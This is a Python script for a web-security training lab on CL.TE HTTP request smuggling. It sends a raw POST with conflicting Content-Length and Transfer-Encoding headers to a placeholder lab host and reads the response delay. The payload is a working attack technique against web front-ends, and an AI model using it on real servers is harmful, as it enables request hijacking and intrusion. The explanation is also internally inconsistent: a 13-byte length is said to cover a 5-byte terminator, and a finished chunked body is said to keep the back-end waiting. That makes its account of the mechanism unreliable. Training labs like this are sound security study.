"""
Lab 1: HTTP request smuggling, basic CL.TE vulnerability
https://portswigger.net/web-security/request-smuggling/finding/lab-finding-basic
Difficulty: Practitioner

📝 Front-end uses Content-Length, back-end uses Transfer-Encoding. Send a
Content-Length that's short — the back-end, following the chunked body,
will finish reading its "0" terminator and then sit waiting for the NEXT
chunk that never comes (because the front-end already considered the
request over and won't send more on this connection) — a classic timeout.
"""

from utils import send_raw, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"

PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

X""".format(host=HOST))


def run():
    note("Content-Length: 13 covers only the chunked terminator '0\\r\\n\\r\\n' —")
    note("the trailing 'X' is left dangling for the back-end to wait on.")
    response, elapsed = send_raw(HOST, PAYLOAD, read_timeout=10)
    log(f"Elapsed: {elapsed:.2f}s")
    if elapsed > 5:
        log("Significant delay observed — consistent with CL.TE vulnerability.")
    else:
        log("No notable delay — try the TE.CL variant instead (Lab 2).", ok=False)


if __name__ == "__main__":
    run()
